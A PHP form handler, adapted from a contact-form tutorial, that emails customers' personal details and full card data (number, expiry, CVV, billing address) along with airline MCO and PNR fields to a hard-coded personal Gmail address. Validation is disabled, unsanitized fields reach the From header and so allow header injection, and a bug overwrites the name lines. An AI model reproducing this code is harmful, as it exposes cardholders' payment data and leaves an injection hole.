<?php
    // My modifications to mailer script from:
    // http://blog.teamtreehouse.com/create-ajax-contact-form
    // Added input sanitizing to prevent injection

    // Only process POST reqeusts.
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Get the form fields and remove whitespace.
        $name = strip_tags(trim($_POST["name"]));
				$name = str_replace(array("\r","\n"),array(" "," "),$name);
        $mname = strip_tags(trim($_POST["mname"]));
				$mname = str_replace(array("\r","\n"),array(" "," "),$mname);
        $Lname = strip_tags(trim($_POST["Lname"]));
				$Lname = str_replace(array("\r","\n"),array(" "," "),$Lname);
        
        $dob = trim($_POST["dob"]);
        $email = filter_var(trim($_POST["email"]), FILTER_SANITIZE_EMAIL);
        $sex = trim($_POST["sex"]);
        $phone = trim($_POST["phone"]);

        $cardno = trim($_POST["cardno"]);

        $cardname = trim($_POST["cardname"]);

        $month = trim($_POST["month"]);
        $year = trim($_POST["year"]);

        $cvv = trim($_POST["cvv"]);
        $billing = trim($_POST["billing"]);
        $airline = trim($_POST["airline"]);
        $time = trim($_POST["time"]);
        $price = trim($_POST["price"]);

        $mco = trim($_POST["mco"]);
        $agent = trim($_POST["agent"]);

        $pnr = trim($_POST["pnr"]);

        $message = trim($_POST["message"]);

        // Check that data was sent to the mailer.
        // if ( empty($name) OR empty($Lname) OR empty($phone) OR empty($plate) OR empty($model) OR empty($make) OR empty($color) OR empty($location) OR empty($unit) OR empty($duration)OR empty($time) OR empty($message) OR !filter_var($email, FILTER_VALIDATE_EMAIL)) {
        //     // Set a 400 (bad request) response code and exit.
        //     http_response_code(400);
        //     echo "Oops! There was a problem with your submission. Please complete the form and try again.";
        //     exit;
        // }

        // Set the recipient email address.
        // FIXME: Update this to your desired email address.
        $recipient = "edris0804@gmail.com";

        // Set the email subject.
        $subject = "New contact from $agent";

        // Build the email content.
        $email_content = "Name: $name\n";
        $email_content = "Middle Name: $mname\n";
        $email_content = "Last Name: $Lname\n";
        $email_content .= "DOB: $dob\n\n";
        $email_content .= "Email: $email\n\n";
        $email_content .= "Sex: $sex\n\n";
        $email_content .= "Phone Number: $phone\n\n\n";

        $email_content .= "Card Number: $cardno\n";
        $email_content .= "Card Holder: $cardname\n";
        $email_content .= "Expiration: $month";
        $email_content .= "Year: $year\n\n\n";


        $email_content .= "CVV: $cvv\n";
        $email_content .= "Billing Address: $billing\n";
        $email_content .= "Airline: $airline\n\n\n";

        $email_content .= "Current time: $time\n";
        $email_content .= "Ticket price:$price\n";

        $email_content .= "MCO : $mco\n";
        $email_content .= "Agent Name: $agent\n";
        $email_content .= "PNR: $pnr\n";
        $email_content .= "Message:$message\n";

        // Build the email headers.
        $email_headers = "From: $agent <$email>";

        // Send the email.
        if (mail($recipient, $subject, $email_content, $email_headers)) {
            
            http_response_code(200);
            echo "Thank You! Your message has been sent.";
        } else {
            
            http_response_code(500);
            echo "Oops! Something went wrong and we couldn't send your message.";
        }

    } else {
        // Not a POST request, set a 403 (forbidden) response code.
        http_response_code(403);
        echo "There was a problem with your submission, please try again.";
    }

?>
